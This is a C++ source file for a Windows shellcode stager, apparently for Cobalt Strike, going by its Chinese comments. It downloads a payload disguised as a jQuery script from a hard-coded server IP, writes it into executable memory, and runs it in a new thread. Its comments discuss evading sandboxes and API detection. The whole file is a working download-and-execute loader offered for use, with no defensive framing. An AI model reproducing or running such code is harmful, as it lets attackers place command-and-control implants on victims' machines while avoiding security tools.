#include <iostream>
#include <Windows.h>
#include <stdio.h>
#include <WinInet.h>

//using namespace std;

#pragma comment(lib,"wininet")

int main(int argc, char* argv[]) {
    //if (argc > 1)//通过传入参数绕过沙箱
    {
        HINTERNET nethandle = InternetOpenA("Mozilla/5.0 (Windows NT 10.0; WOW64) (KHTML, like Gecko) Chrome/77.0 Safari/536", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);//user-agent可以修改
        if (nethandle == NULL) {
            printf("internet open error:%d\n", GetLastError());
            return 0;
        }
        char* host = (char*)"192.168.211.129";//cs的ip
        HINTERNET Session = InternetConnectA(nethandle, host, INTERNET_DEFAULT_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
        if (Session == NULL)
        {
            printf("internet connect error:%d\n", GetLastError());
            return 0;
        }
        HINTERNET HttpRequest = HttpOpenRequestA(Session, "GET", "/jquery-3.3.2.slim.min.js", "HTTP/1.0", NULL, NULL, INTERNET_FLAG_DONT_CACHE, 0);//通过get请求profile文件中的url地址
        if (HttpRequest == NULL) {
            printf("http open request error:%d\n", GetLastError());
            return 0;
        }
        int ret = HttpSendRequestA(HttpRequest, NULL, 0, NULL, 0);
        if (ret == FALSE) {
            printf("http send request error:%d\n", GetLastError());
            return 0;
        }
        char* statscode[16] = { 0 };
        int size = 16;
        ret = HttpQueryInfoA(HttpRequest, HTTP_QUERY_STATUS_CODE, statscode, (LPDWORD)&size, NULL);
        if (ret == FALSE) {
            printf("httpqueryinfo error:%d\n", GetLastError());
            return 0;
        }
        int scode = atoi((const char*)statscode);
        printf("code:%d\n", scode);
        if (scode != HTTP_STATUS_OK && scode != HTTP_STATUS_CREATED) {
            printf("%d please retry\n", scode);
            return 0;
        }
        char* contentL[16] = { 0 };
        size = 16;
        ret = HttpQueryInfoA(HttpRequest, HTTP_QUERY_CONTENT_LENGTH, contentL, (LPDWORD)&size, NULL);
        int length = atoi((const char*)contentL);
        //cout << "length:" << length << "\n";
        if (ret == FALSE) {
            printf("htttpqueryinfo error:%d\n", GetLastError());
            return 0;
        }
        void* c = VirtualAlloc(NULL, length + 1, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        int readed = 0;
        InternetReadFile(HttpRequest, c, length + 1, (LPDWORD)&readed);
        char* cc = (char*)c + 11;//跳过配置文件前面追加字符
        HANDLE ct = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)cc, NULL, 0, NULL);//这里可能会被检测到api
        WaitForSingleObject(ct, INFINITE);
        VirtualFree(c, length + 1, MEM_DECOMMIT);
    }
    //else {
    //    printf("hello world\n");
    //}
    return 0;
}
